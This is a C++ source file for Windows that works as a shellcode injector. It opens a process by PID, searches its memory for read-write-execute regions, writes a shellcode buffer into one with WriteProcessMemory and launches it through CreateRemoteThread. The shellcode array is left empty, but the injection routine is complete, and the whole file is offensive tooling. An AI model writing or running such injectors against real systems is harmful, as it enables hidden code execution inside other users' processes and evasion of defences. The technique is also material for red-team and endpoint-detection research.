#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <tlhelp32.h>
#include <stdlib.h>  

int main(int argc, char* argv[]) {
    // Var declaration
    MEMORY_BASIC_INFORMATION peMem;
    PROCESSENTRY32 pe;
    LPVOID addr = 0;
    HANDLE hPe = NULL;
    HANDLE hPeSnapshot;
    BOOL hResult;
    pe.dwSize = sizeof(PROCESSENTRY32);

    DWORD pid = atoi(argv[1]);

    unsigned char shellcode[] = "";

    // Take snapshot of all running processes 
    hPeSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hPeSnapshot) return -1; // must handle this exception or else
    hResult = Process32First(hPeSnapshot, &pe);  

    int flag = 0;
    while (hResult) {
        hPe = OpenProcess(MAXIMUM_ALLOWED, false, (DWORD)pid); // target PID
        if (hPe) {
            while (VirtualQueryEx(hPe, addr, &peMem, sizeof(peMem))) { // query process memory
                addr = (LPVOID)((DWORD_PTR)peMem.BaseAddress + peMem.RegionSize);
                if (peMem.AllocationProtect == PAGE_EXECUTE_READWRITE) { // if memory is RWX
                    printf("Found RWX region at 0x%x\n", peMem.BaseAddress);
                    printf("Inject shellcode?\n");
                    system("pause");
                    WriteProcessMemory(hPe, peMem.BaseAddress, shellcode, sizeof(shellcode), NULL); // write our shellcode to memory region
                    printf("\nShellcode injected!\n");
                    printf("Execute shellcode?\n");
                    system("pause");
                    CreateRemoteThread(hPe, NULL, NULL, (LPTHREAD_START_ROUTINE)peMem.BaseAddress, NULL, NULL, NULL); // create thread run shellcode 
                    flag = 1;
                    break;
                }

            }

        }
        if (flag == 1) {
            break;
        }
    }
    // cleanup
    CloseHandle(hPeSnapshot);
    CloseHandle(hPe);
    return 0;

}
